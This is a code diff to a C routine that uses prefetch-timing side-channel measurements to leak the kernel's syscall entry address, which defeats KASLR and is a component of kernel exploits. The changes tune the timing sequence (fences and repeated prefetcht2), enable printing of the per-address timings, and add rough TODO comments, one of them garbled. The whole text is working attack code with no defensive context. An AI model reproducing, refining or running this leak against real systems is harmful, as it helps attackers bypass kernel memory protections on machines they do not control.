@@ -7,11 +7,12 @@ uint64_t sidechannel(uint64_t addr) {
     "mov %0, rax;"
     "mov %1, rdx;"
     "xor rax, rax;"
-    "lfence;"
-    "prefetchnta qword ptr [%4];"
+    "mfence;"
+    "prefetcht2 qword ptr [%4];"
+    "prefetcht2 qword ptr [%4];"
     "prefetcht2 qword ptr [%4];"
     "xor rax, rax;"
-    "lfence;"
+    "mfence;"
     "rdtscp;"
     "mov %2, rax;"
     "mov %3, rdx;"
@@ -66,9 +67,12 @@ uint64_t leak_syscall_entry(void)
             uint64_t time = sidechannel(test);
             if (i >= DUMMY_ITERATIONS)
                 data[idx] += time;
+            
         }
     }
-
+    // 1. Is my cache too huge so it keeps pages in the last round in the cache? [TODO]
+    // 2. Find the dental
+    // 3. The first 0x10 
     for (int i = 0; i < ARR_SIZE; i++)
     {
         data[i] /= ITERATIONS;
@@ -77,7 +81,7 @@ uint64_t leak_syscall_entry(void)
             min = data[i];
             addr = SCAN_START + i * STEP;
         }
-        // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
+        printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
     }
 
     return addr;
